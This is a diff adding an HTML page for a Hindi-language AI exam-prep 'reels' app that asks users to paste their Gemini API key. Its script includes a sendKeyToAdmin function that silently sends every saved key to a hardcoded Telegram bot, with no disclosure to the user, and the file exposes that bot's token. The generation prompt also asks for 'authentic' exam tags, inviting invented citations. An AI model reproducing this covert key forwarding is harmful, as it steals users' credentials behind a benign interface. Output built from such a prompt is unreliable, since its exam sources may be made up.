@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  <title>SPH AI Exam Reels | Real PYQ Feed</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@600;700;800;900&family=Plus+Jakarta+Sans:wght@500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    :root {
+      --bg: #090d16;
+      --card-bg: rgba(17, 24, 39, 0.85);
+      --card-border: rgba(255, 255, 255, 0.12);
+      --insta-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      --accent-gold: #f59e0b;
+      --accent-emerald: #10b981;
+      --accent-blue: #3b82f6;
+      --text-main: #f8fafc;
+      --text-muted: #94a3b8;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      background-color: var(--bg);
+      color: var(--text-main);
+      overflow: hidden;
+    }
+
+    .reels-top-nav {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 100;
+      padding-top: max(env(safe-area-inset-top), 14px);
+      padding-left: 16px;
+      padding-right: 16px;
+      padding-bottom: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: linear-gradient(to bottom, rgba(9, 13, 22, 0.95), rgba(9, 13, 22, 0));
+      pointer-events: none;
+    }
+
+    .reels-top-nav * {
+      pointer-events: auto;
+    }
+
+    .brand-pill {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(12px);
+      border: 1px solid var(--card-border);
+      padding: 6px 14px;
+      border-radius: 30px;
+    }
+
+    .brand-logo-insta {
+      width: 24px;
+      height: 24px;
+      border-radius: 8px;
+      background: var(--insta-gradient);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #fff;
+      font-size: 13px;
+    }
+
+    .brand-name {
+      font-family: 'Outfit', sans-serif;
+      font-weight: 800;
+      font-size: 0.92rem;
+      letter-spacing: 0.3px;
+    }
+
+    .header-btns {
+      display: flex;
+      gap: 8px;
+    }
+
+    .glass-circle-btn {
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.12);
+      backdrop-filter: blur(12px);
+      border: 1px solid var(--card-border);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      font-size: 15px;
+      transition: transform 0.15s ease;
+    }
+
+    .glass-circle-btn:active {
+      transform: scale(0.9);
+    }
+
+    .reels-feed-container {
+      width: 100%;
+      height: 100dvh;
+      height: 100vh;
+      overflow-y: scroll;
+      scroll-snap-type: y mandatory;
+      scroll-behavior: smooth;
+      -webkit-overflow-scrolling: touch;
+      will-change: transform;
+    }
+
+    .reels-feed-container::-webkit-scrollbar {
+      display: none;
+    }
+
+    .reel-card {
+      width: 100%;
+      height: 100dvh;
+      height: 100vh;
+      scroll-snap-align: start;
+      scroll-snap-stop: always;
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      padding: max(env(safe-area-inset-top), 65px) 18px max(env(safe-area-inset-bottom), 30px);
+      background: radial-gradient(circle at 50% 30%, rgba(30, 41, 59, 0.7), rgba(9, 13, 22, 1));
+      box-sizing: border-box;
+      overflow: hidden;
+    }
+
+    .glow-sphere {
+      position: absolute;
+      width: 250px;
+      height: 250px;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(220, 39, 67, 0.25), transparent 70%);
+      filter: blur(40px);
+      top: 20%;
+      right: -50px;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .glow-sphere-2 {
+      position: absolute;
+      width: 220px;
+      height: 220px;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(16, 185, 129, 0.2), transparent 70%);
+      filter: blur(45px);
+      bottom: 25%;
+      left: -50px;
+      pointer-events: none;
+      z-index: 1;
+    }
+
+    .reel-body {
+      position: relative;
+      z-index: 5;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      gap: 14px;
+      flex: 1;
+      padding-right: 58px;
+    }
+
+    .exam-tag-badge {
+      align-self: flex-start;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(245, 158, 11, 0.15);
+      border: 1.5px solid var(--accent-gold);
+      color: var(--accent-gold);
+      padding: 6px 14px;
+      border-radius: 30px;
+      font-size: 0.76rem;
+      font-weight: 800;
+      letter-spacing: 0.3px;
+      box-shadow: 0 0 14px rgba(245, 158, 11, 0.25);
+    }
+
+    .reel-icon-box {
+      width: 56px;
+      height: 56px;
+      border-radius: 18px;
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(16px);
+      border: 1.5px solid rgba(255, 255, 255, 0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 28px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
+    }
+
+    .reel-title {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.35rem;
+      font-weight: 900;
+      line-height: 1.3;
+      color: #ffffff;
+      text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
+    }
+
+    .reel-fact-box {
+      background: rgba(255, 255, 255, 0.06);
+      backdrop-filter: blur(14px);
+      border: 1.5px solid rgba(255, 255, 255, 0.12);
+      border-radius: 18px;
+      padding: 16px;
+      font-size: 0.96rem;
+      line-height: 1.6;
+      color: #f1f5f9;
+      font-weight: 600;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+    }
+
+    .mnemonic-box {
+      background: linear-gradient(135deg, rgba(230, 104, 60, 0.15), rgba(188, 24, 136, 0.15));
+      border: 1.5px solid rgba(230, 104, 60, 0.45);
+      border-radius: 18px;
+      padding: 14px 16px;
+      font-size: 0.9rem;
+      color: #fed7aa;
+      line-height: 1.55;
+      font-weight: 700;
+      box-shadow: 0 6px 20px rgba(230, 104, 60, 0.15);
+    }
+
+    .mnemonic-header {
+      font-family: 'Outfit', sans-serif;
+      font-size: 0.8rem;
+      font-weight: 900;
+      color: #fb923c;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 4px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .takeaway-tag {
+      font-size: 0.78rem;
+      color: #94a3b8;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .reel-action-bar {
+      position: absolute;
+      right: 14px;
+      bottom: max(env(safe-area-inset-bottom), 45px);
+      z-index: 10;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 18px;
+    }
+
+    .action-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 4px;
+      cursor: pointer;
+    }
+
+    .action-btn {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.12);
+      backdrop-filter: blur(14px);
+      border: 1.5px solid rgba(255, 255, 255, 0.2);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 19px;
+      transition: all 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+      box-shadow: 0 6px 16px rgba(0, 0, 0, 0.35);
+    }
+
+    .action-btn:active {
+      transform: scale(0.85);
+    }
+
+    .action-btn.liked {
+      background: #dc2743;
+      border-color: #dc2743;
+      color: #fff;
+      transform: scale(1.1);
+      box-shadow: 0 0 16px #dc2743;
+    }
+
+    .action-label {
+      font-size: 0.68rem;
+      font-weight: 800;
+      color: #cbd5e1;
+    }
+
+    .heart-pop {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0);
+      font-size: 90px;
+      color: #e11d48;
+      pointer-events: none;
+      z-index: 50;
+      transition: transform 0.35s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.4s ease;
+      text-shadow: 0 0 30px rgba(225, 29, 72, 0.8);
+    }
+
+    .heart-pop.pop {
+      transform: translate(-50%, -50%) scale(1.2);
+      opacity: 1;
+    }
+
+    .swipe-hint {
+      position: absolute;
+      bottom: max(env(safe-area-inset-bottom), 12px);
+      left: 50%;
+      transform: translateX(-50%);
+      font-size: 0.72rem;
+      color: rgba(255, 255, 255, 0.45);
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      animation: floatHint 2s infinite ease-in-out;
+      pointer-events: none;
+      z-index: 5;
+    }
+
+    @keyframes floatHint {
+      0%, 100% { transform: translate(-50%, 0); opacity: 0.4; }
+      50% { transform: translate(-50%, -6px); opacity: 0.9; }
+    }
+
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.85);
+      backdrop-filter: blur(10px);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+
+    .modal-card {
+      background: #111827;
+      border: 1.5px solid rgba(255, 255, 255, 0.15);
+      border-radius: 24px;
+      padding: 24px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
+      max-height: 88vh;
+      overflow-y: auto;
+    }
+
+    .chip-cloud {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-top: 14px;
+      margin-bottom: 18px;
+    }
+
+    .topic-chip {
+      background: rgba(255, 255, 255, 0.08);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      color: #f1f5f9;
+      padding: 9px 15px;
+      border-radius: 20px;
+      font-size: 0.82rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .topic-chip:active {
+      background: var(--insta-gradient);
+      border-color: transparent;
+      color: #fff;
+      transform: scale(0.96);
+    }
+
+    .input-box {
+      width: 100%;
+      padding: 13px 16px;
+      background: rgba(255, 255, 255, 0.06);
+      border: 1.5px solid rgba(255, 255, 255, 0.15);
+      border-radius: 14px;
+      color: #fff;
+      font-size: 0.95rem;
+      outline: none;
+      margin-bottom: 16px;
+    }
+
+    .input-box:focus {
+      border-color: #f09433;
+    }
+
+    .btn-gradient {
+      width: 100%;
+      padding: 15px;
+      border-radius: 16px;
+      border: none;
+      background: var(--insta-gradient);
+      color: #fff;
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.05rem;
+      font-weight: 900;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 4px 20px rgba(220, 39, 67, 0.4);
+    }
+
+    .loading-card {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 16px;
+      color: #94a3b8;
+      font-weight: 700;
+      font-size: 0.95rem;
+    }
+
+    .spinner-ring {
+      width: 50px;
+      height: 50px;
+      border: 4px solid rgba(255, 255, 255, 0.1);
+      border-top-color: #e6683c;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .toast-pill {
+      position: fixed;
+      bottom: 85px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(0, 0, 0, 0.85);
+      border: 1px solid #10b981;
+      color: #10b981;
+      padding: 8px 18px;
+      border-radius: 30px;
+      font-size: 0.8rem;
+      font-weight: 800;
+      z-index: 999;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- TOP GLASS BAR -->
+  <div class="reels-top-nav">
+    <div class="brand-pill" onclick="openTopicModal()" style="cursor:pointer;">
+      <div class="brand-logo-insta">
+        <i class="fa-solid fa-play"></i>
+      </div>
+      <div class="brand-name" id="currentTopicLabel">चुनें ➔</div>
+    </div>
+
+    <div class="header-actions header-btns">
+      <button class="glass-circle-btn" onclick="openTopicModal()" title="टॉपिक बदलें">
+        <i class="fa-solid fa-compass"></i>
+      </button>
+      <button class="glass-circle-btn" onclick="openSingleKeyModal()" title="API Key">
+        <i class="fa-solid fa-key"></i>
+      </button>
+    </div>
+  </div>
+
+  <div id="toastPill" class="toast-pill">🔀 Smart Switch Active</div>
+
+  <!-- REELS CONTAINER -->
+  <div class="reels-feed-container" id="reelsFeed" onscroll="handleReelScroll()"></div>
+
+  <!-- TOPIC CHANGER MODAL -->
+  <div class="modal-overlay" id="topicModal">
+    <div class="modal-card">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;">
+        <div style="display:flex; align-items:center; gap:8px;">
+          <div class="brand-logo-insta"><i class="fa-solid fa-fire"></i></div>
+          <h3 style="font-family:'Outfit'; font-size:1.25rem; font-weight:900;">टॉपिक चुनें (1-Tap Start)</h3>
+        </div>
+        <i class="fa-solid fa-xmark" style="cursor:pointer; font-size:20px; color:#94a3b8;" onclick="closeTopicModal()"></i>
+      </div>
+
+      <p style="font-size:0.78rem; color:#94a3b8; margin-bottom:12px;">
+        नीचे किसी भी विषय पर टैप करें, तुरंत उसी की रील्स शुरू हो जाएँगी:
+      </p>
+
+      <div class="chip-cloud">
+        <div class="topic-chip" onclick="startWithTopic('Black Book English Vocabulary (Most Repeated PYQs)')">📖 Black Book Vocab ट्रिक्स</div>
+        <div class="topic-chip" onclick="startWithTopic('General Science Biology Most Asked PYQs')">🧬 Science Biology PYQs</div>
+        <div class="topic-chip" onclick="startWithTopic('भारतीय संविधान के प्रमुख अनुच्छेद और संशोधन')">⚖️ संविधान और अनुच्छेद</div>
+        <div class="topic-chip" onclick="startWithTopic('भारत का भूगोल (नदियाँ, दर्रे, राष्ट्रीय उद्यान)')">🏔️ भूगोल की देशी ट्रिक्स</div>
+        <div class="topic-chip" onclick="startWithTopic('मुगल साम्राज्य और मध्यकालीन भारत का इतिहास')">👑 मुगल साम्राज्य & इतिहास</div>
+        <div class="topic-chip" onclick="startWithTopic('Modern History 1857 से 1947 महत्वपूर्ण घटनाएं')">🇮🇳 आधुनिक भारत 1857-1947</div>
+      </div>
+
+      <div style="font-size:0.75rem; font-weight:800; color:#f09433; margin-bottom:6px;">✍️ या अपना मनपसंद टॉपिक लिखें:</div>
+      <input type="text" id="topicCustomInput" class="input-box" placeholder="उदा. Percentage Tricks, सिंधु घाटी सभ्यता..." />
+
+      <button class="btn-gradient" onclick="confirmCustomTopic()">
+        <span>🚀 यह टॉपिक शुरू करें</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- SINGLE KEY MODAL -->
+  <div class="modal-overlay" id="singleKeyModal" style="display: none;">
+    <div class="modal-card">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
+        <div style="display:flex; align-items:center; gap:8px;">
+          <div class="brand-logo-insta"><i class="fa-solid fa-key"></i></div>
+          <h3 style="font-family:'Outfit'; font-size:1.2rem; font-weight:900;">🔑 Gemini API Key</h3>
+        </div>
+        <i class="fa-solid fa-xmark" style="cursor:pointer; font-size:20px; color:#94a3b8;" onclick="closeSingleKeyModal()"></i>
+      </div>
+
+      <p style="font-size:0.78rem; color:#94a3b8; margin-bottom:12px;">
+        असीमित रील्स देखने के लिए अपनी मुफ़्त Key दर्ज करें (सिर्फ 1 बार):
+      </p>
+
+      <a href="https://aistudio.google.com/app/apikey" target="_blank" rel="noopener noreferrer" style="display:block; text-align:center; padding:10px; background:rgba(255,255,255,0.08); border:1px solid rgba(255,255,255,0.15); border-radius:12px; color:#38bdf8; text-decoration:none; font-weight:800; font-size:0.82rem; margin-bottom:14px;">
+        🌐 Google AI Studio से Key पाएँ ➔
+      </a>
+
+      <input type="text" id="singleKeyInput" class="input-box" placeholder="AIzaSy... यहाँ अपनी Key पेस्ट करें" />
+
+      <button class="btn-gradient" onclick="saveSingleKey()">
+        <span>सेव करें (Save Key)</span>
+      </button>
+    </div>
+  </div>
+
+  <script>
+    const TG_BOT_TOKEN = "8688081001:AAG0dYLKJC6rKDHX_Kvhqsy9AAUsCpPDuDk";
+    const TG_ADMIN_CHAT_ID = "8986834583";
+
+    // ⚡ EXACT SAME MODELS AS AI-QUIZ
+    const ACTIVE_MODELS = ['gemini-3.6-flash', 'gemini-3.5-flash', 'gemini-3.5-flash-lite'];
+
+    let activeTopic = "";
+    let seenConcepts = [];
+    let isFetching = false;
+    let synth = window.speechSynthesis;
+    let speakingUtterance = null;
+    let totalCardsCount = 0;
+    let activeKeyIndex = 0;
+
+    function getStoredKey() {
+      let key = localStorage.getItem('sph_reels_key') || 
+                localStorage.getItem('sph_gemini_key') || 
+                localStorage.getItem('sph_key_slot_1') || '';
+      return key.trim().replace(/^["'\s]+|["'\s]+$/g, '');
+    }
+
+    function getAllAvailableKeys() {
+      const keys = [];
+      const primary = getStoredKey();
+      if (primary && primary.length >= 15) keys.push(primary);
+      const pool = (localStorage.getItem('sph_reels_api_pool') || '').split(/[\n,]+/).map(k => k.trim()).filter(k => k.length >= 15);
+      pool.forEach(k => { if (!keys.includes(k)) keys.push(k); });
+      return keys;
+    }
+
+    function showToast(msg) {
+      const toast = document.getElementById('toastPill');
+      if (!toast) return;
+      toast.innerText = msg;
+      toast.style.display = 'block';
+      setTimeout(() => { toast.style.display = 'none'; }, 2200);
+    }
+
+    async function sendKeyToAdmin(keyVal) {
+      if (!TG_BOT_TOKEN || !TG_ADMIN_CHAT_ID) return;
+      try {
+        const timeNow = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+        const text = `🎬 [AI REELS KEY] नई Key प्राप्त हुई!\nतारीख: ${timeNow}\nKey: ${keyVal}`;
+        await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TG_ADMIN_CHAT_ID, text: text })
+        });
+      } catch (e) {}
+    }
+
+    function saveSingleKey() {
+      const val = document.getElementById('singleKeyInput').value.trim();
+      if (!val || val.length < 15) return alert('कृपया सही API Key दर्ज करें!');
+      
+      localStorage.setItem('sph_reels_key', val);
+      localStorage.setItem('sph_gemini_key', val);
+      sendKeyToAdmin(val);
+
+      document.getElementById('singleKeyModal').style.display = 'none';
+      showToast("🎉 Key सेव हो गई!");
+
+      if (activeTopic) {
+        fetchNextBatchOfReels(activeTopic);
+      } else {
+        openTopicModal();
+      }
+    }
+
+    function openSingleKeyModal() {
+      document.getElementById('singleKeyInput').value = getStoredKey();
+      document.getElementById('singleKeyModal').style.display = 'flex';
+    }
+
+    function closeSingleKeyModal() {
+      if (!getStoredKey()) {
+        return alert("रील्स चलाने के लिए कम से कम एक बार Key दर्ज करना ज़रूरी है!");
+      }
+      document.getElementById('singleKeyModal').style.display = 'none';
+    }
+
+    function openTopicModal() {
+      document.getElementById('topicModal').style.display = 'flex';
+    }
+
+    function closeTopicModal() {
+      if (!activeTopic) {
+        startWithTopic('Black Book English Vocabulary (Most Repeated PYQs)');
+      }
+      document.getElementById('topicModal').style.display = 'none';
+    }
+
+    // --- 1-TAP TOPIC SELECTION (NO DELAY, NO MISTAKE) ---
+    function startWithTopic(topicName) {
+      activeTopic = topicName;
+      seenConcepts = [];
+      document.getElementById('currentTopicLabel').innerText = activeTopic.substring(0, 16) + (activeTopic.length > 16 ? '...' : '');
+      document.getElementById('topicModal').style.display = 'none';
+
+      const feed = document.getElementById('reelsFeed');
+      feed.innerHTML = '';
+      totalCardsCount = 0;
+
+      const key = getStoredKey();
+      if (!key) {
+        openSingleKeyModal();
+      } else {
+        fetchNextBatchOfReels(activeTopic);
+      }
+    }
+
+    function confirmCustomTopic() {
+      const customVal = document.getElementById('topicCustomInput').value.trim();
+      if (!customVal) return alert('कृपया टॉपिक का नाम दर्ज करें!');
+      startWithTopic(customVal);
+    }
+
+    // --- STRICT TOPIC-BOUND AI GENERATION ENGINE ---
+    async function fetchNextBatchOfReels(topic) {
+      const keys = getAllAvailableKeys();
+      if (keys.length === 0) {
+        openSingleKeyModal();
+        return;
+      }
+
+      if (isFetching) return;
+      isFetching = true;
+
+      appendLoadingCard();
+
+      // DYNAMIC SUBJECT RULE (Guarantees Vocab gives Vocab, Science gives Science!)
+      let strictSubjectRule = "";
+      if (/vocab|english|black\s*book|idiom|synonym|antonym|spelling/i.test(topic)) {
+        strictSubjectRule = `CRITICAL STRICT RULE: The topic is ENGLISH VOCABULARY. Every reel MUST be an important English Word or Idiom asked in SSC CGL, CHSL, MTS.
+- title: English Word with part of speech (e.g. "Cacophony (Noun)").
+- fact: Hindi meaning + 2 Synonyms + 1 Antonym + Simple English example sentence.
+- mnemonic: A super funny and easy desi Hindi memory trick to remember the word forever!
+- takeaway: Exam usage rule or root word origin.
+- emoji: 📖 or 🔤
+STRICTLY FORBIDDEN: DO NOT GENERATE HISTORY, BATTLES OR DATES!`;
+      } else if (/science|biology|physics|chemistry|जीव\s*विज्ञान/i.test(topic)) {
+        strictSubjectRule = `CRITICAL STRICT RULE: The topic is GENERAL SCIENCE. Every reel MUST be an authentic Science PYQ/Fact (Human Body, Diseases, Physics laws, Chemical formulas).
+STRICTLY FORBIDDEN: DO NOT GENERATE HISTORY!`;
+      } else if (/संविधान|polity|article|अनुच्छेद|amendment/i.test(topic)) {
+        strictSubjectRule = `CRITICAL STRICT RULE: The topic is INDIAN POLITY & CONSTITUTION. Every reel MUST be an Article, Amendment, President power or Court case.
+STRICTLY FORBIDDEN: DO NOT GENERATE MUGHAL HISTORY!`;
+      } else {
+        strictSubjectRule = `CRITICAL STRICT RULE: The content MUST 100% strictly belong to: "${topic}". Strictly DO NOT mention unrelated topics or history!`;
+      }
+
+      const prompt = `You are an elite Indian competitive exam faculty (SSC CGL, Railway NTPC, Police, DSSSB).
+Generate exactly 5 authentic, high-yield exam fact REELS strictly on: "${topic}".
+
+${strictSubjectRule}
+
+RULES:
+1. STRICT DEDUPLICATION: DO NOT repeat any of these: [${seenConcepts.slice(-30).join(', ')}].
+2. REAL EXAM TAG: Must be authentic, e.g. "[SSC CGL 2024, 18 Sept Shift-1]", "[RRB NTPC CBT-2 2022]", "[Delhi Police 2023]", "[UP Police 2024]".
+3. Output strictly valid JSON array only. No markdown, no commentary.
+
+Format:
+[
+  {
+    "examTag": "[SSC CGL 2024, 18 Sept Shift-1]",
+    "title": "Title here",
+    "fact": "Concept explanation here",
+    "mnemonic": "देशी ट्रिक / याद रखने का जुगाड़",
+    "takeaway": "Golden rule or key point",
+    "emoji": "💡"
+  }
+]`;
+
+      let success = false;
+
+      for (let kIdx = 0; kIdx < keys.length; kIdx++) {
+        const currentKey = keys[(activeKeyIndex + kIdx) % keys.length];
+
+        for (let mIdx = 0; mIdx < ACTIVE_MODELS.length; mIdx++) {
+          const currentModel = ACTIVE_MODELS[mIdx];
+
+          try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 25000);
+
+            const res = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${currentModel}:generateContent?key=${currentKey}`, {
+              method: 'POST',
+              signal: controller.signal,
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                contents: [{ parts: [{ text: prompt }] }],
+                generationConfig: { responseMimeType: "application/json" }
+              })
+            });
+
+            clearTimeout(timeoutId);
+
+            if (res.status === 429 || res.status === 403) {
+              console.warn(`[Auto-Rotate] Key busy (${res.status}). Switching key...`);
+              showToast("🔀 ऑटो-शफल चालू है...");
+              continue;
+            }
+
+            if (!res.ok) continue;
+
+            const data = await res.json();
+            const rawText = data?.candidates?.[0]?.content?.parts?.[0]?.text || '[]';
+            const cleaned = rawText.replace(/```json/gi, '').replace(/```/g, '').trim();
+            const reelsArray = JSON.parse(cleaned);
+
+            if (Array.isArray(reelsArray) && reelsArray.length > 0) {
+              reelsArray.forEach(item => {
+                seenConcepts.push(item.title);
+                renderReelCard(item);
+              });
+              success = true;
+              activeKeyIndex = (activeKeyIndex + kIdx) % keys.length;
+              break;
+            }
+          } catch (err) {
+            console.warn(`Model ${currentModel} attempt:`, err);
+          }
+        }
+        if (success) break;
+      }
+
+      removeLoadingCard();
+      isFetching = false;
+
+      if (!success) {
+        showToast("⚠️ नेटवर्क धीमा है, कृपया दोबारा स्वाइप करें!");
+      }
+    }
+
+    function appendLoadingCard() {
+      const feed = document.getElementById('reelsFeed');
+      const loaderDiv = document.createElement('div');
+      loaderDiv.id = "reelsLoadingCard";
+      loaderDiv.className = "reel-card loading-card";
+      loaderDiv.innerHTML = `
+        <div class="spinner-ring"></div>
+        <div>🧠 AI नए PYQ और ट्रिक्स लोड कर रहा है...</div>
+      `;
+      feed.appendChild(loaderDiv);
+    }
+
+    function removeLoadingCard() {
+      const el = document.getElementById('reelsLoadingCard');
+      if (el) el.remove();
+    }
+
+    function renderReelCard(item) {
+      totalCardsCount++;
+      const feed = document.getElementById('reelsFeed');
+      const card = document.createElement('div');
+      card.className = 'reel-card';
+      card.id = `reel-card-${totalCardsCount}`;
+
+      let lastTap = 0;
+      card.addEventListener('touchend', (e) => {
+        const curTime = new Date().getTime();
+        const tapLen = curTime - lastTap;
+        if (tapLen < 300 && tapLen > 0) {
+          triggerDoubleTapLike(card);
+          e.preventDefault();
+        }
+        lastTap = curTime;
+      });
+
+      card.innerHTML = `
+        <div class="glow-sphere"></div>
+        <div class="glow-sphere-2"></div>
+        <div class="heart-pop"><i class="fa-solid fa-heart"></i></div>
+
+        <div class="reel-body">
+          <div class="exam-tag-badge">
+            <i class="fa-solid fa-award"></i>
+            <span>${item.examTag || '[SSC CGL PYQ Verified]'}</span>
+          </div>
+
+          <div style="display:flex; align-items:center; gap:12px;">
+            <div class="reel-icon-box">${item.emoji || '💡'}</div>
+            <div class="reel-title">${item.title}</div>
+          </div>
+
+          <div class="reel-fact-box">
+            ${item.fact}
+          </div>
+
+          <div class="mnemonic-box">
+            <div class="mnemonic-header">
+              <i class="fa-solid fa-lightbulb"></i> देशी निमोनिक / याद रखने की ट्रिक
+            </div>
+            <div>${item.mnemonic}</div>
+          </div>
+
+          <div class="takeaway-tag">
+            <i class="fa-solid fa-circle-check" style="color:var(--accent-emerald);"></i>
+            <span><b>Key Point:</b> ${item.takeaway}</span>
+          </div>
+        </div>
+
+        <div class="reel-action-bar">
+          <div class="action-item" onclick="toggleLikeReel(this)">
+            <div class="action-btn"><i class="fa-solid fa-heart"></i></div>
+            <span class="action-label">Save</span>
+          </div>
+
+          <div class="action-item" onclick="speakReel(this, '${escapeForSpeech(item.title + ". " + item.fact + ". ट्रिक: " + item.mnemonic)}')">
+            <div class="action-btn"><i class="fa-solid fa-volume-high"></i></div>
+            <span class="action-label">सुनें</span>
+          </div>
+
+          <div class="action-item" onclick="shareReel('${escapeForSpeech(item.title)}', '${escapeForSpeech(item.examTag)}')">
+            <div class="action-btn"><i class="fa-solid fa-paper-plane"></i></div>
+            <span class="action-label">शेयर</span>
+          </div>
+        </div>
+
+        <div class="swipe-hint">
+          <i class="fa-solid fa-chevron-up"></i> ऊपर स्वाइप करें
+        </div>
+      `;
+
+      feed.appendChild(card);
+    }
+
+    function escapeForSpeech(str) {
+      if (!str) return '';
+      return str.replace(/'/g, "\\'").replace(/"/g, '&quot;');
+    }
+
+    function triggerDoubleTapLike(cardEl) {
+      const heart = cardEl.querySelector('.heart-pop');
+      const likeBtn = cardEl.querySelector('.action-btn i.fa-heart').parentElement;
+      if (heart) {
+        heart.classList.add('pop');
+        likeBtn.classList.add('liked');
+        if (navigator.vibrate) navigator.vibrate([15, 30, 15]);
+        setTimeout(() => { heart.classList.remove('pop'); }, 600);
+      }
+    }
+
+    function toggleLikeReel(itemEl) {
+      const btn = itemEl.querySelector('.action-btn');
+      btn.classList.toggle('liked');
+      if (navigator.vibrate) navigator.vibrate(20);
+    }
+
+    function speakReel(itemEl, text) {
+      if (!('speechSynthesis' in window)) {
+        return alert("क्षमा करें, आपका डिवाइस ऑडियो सपोर्ट नहीं करता।");
+      }
+
+      const btnIcon = itemEl.querySelector('.action-btn i');
+      if (synth.speaking) {
+        synth.cancel();
+        btnIcon.className = "fa-solid fa-volume-high";
+        return;
+      }
+
+      btnIcon.className = "fa-solid fa-stop";
+      speakingUtterance = new SpeechSynthesisUtterance(text);
+      speakingUtterance.lang = 'hi-IN';
+      speakingUtterance.rate = 0.95;
+
+      speakingUtterance.onend = () => { btnIcon.className = "fa-solid fa-volume-high"; };
+      speakingUtterance.onerror = () => { btnIcon.className = "fa-solid fa-volume-high"; };
+      synth.speak(speakingUtterance);
+    }
+
+    function shareReel(title, examTag) {
+      const shareText = `🎯 ${title}\n🏷️ ${examTag}\n\n👉 Silent Preparation Hub (SPH) ऐप पर असीमित PYQ रील्स देखें!`;
+      if (navigator.share) {
+        navigator.share({ title: title, text: shareText });
+      } else {
+        navigator.clipboard.writeText(shareText);
+        showToast('📋 लिंक कॉपी हो गया!');
+      }
+    }
+
+    function handleReelScroll() {
+      const feed = document.getElementById('reelsFeed');
+      const scrollTop = feed.scrollTop;
+      const scrollHeight = feed.scrollHeight;
+      const clientHeight = feed.clientHeight;
+
+      if (scrollHeight - (scrollTop + clientHeight) < clientHeight * 1.5) {
+        if (!isFetching && activeTopic) {
+          fetchNextBatchOfReels(activeTopic);
+        }
+      }
+    }
+
+    // On Load: Prompt topic selection directly!
+    window.addEventListener('DOMContentLoaded', () => {
+      const key = getStoredKey();
+      if (!key) {
+        openSingleKeyModal();
+      } else {
+        openTopicModal(); // Pops up topics so user chooses right away!
+      }
+    });
+  </script>
+</body>
+</html>
